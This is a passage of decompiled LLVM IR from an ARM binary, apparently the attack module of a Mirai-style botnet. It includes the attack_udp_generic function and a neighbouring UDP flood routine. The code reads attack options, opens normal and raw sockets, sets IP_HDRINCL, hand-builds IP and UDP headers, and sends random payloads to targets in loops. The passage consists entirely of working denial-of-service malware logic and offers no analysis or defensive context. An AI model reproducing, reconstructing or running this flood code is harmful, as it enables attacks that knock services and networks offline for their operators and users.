  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v5_b654 = inttoptr i32 %v0_b640 to i32*
  %v6_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v5_b654, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v6_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %v5_b674 = inttoptr i32 %v0_b660 to i32*
  %v6_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v5_b674, i32 6, i32 %v0_b668, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v6_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v6_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7f4 = and i32 %v0_b7e8, 65280
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v5_b800 = call i32 @llvm.bswap.i32(i32 %v0_b7e8)
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 3, 2, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
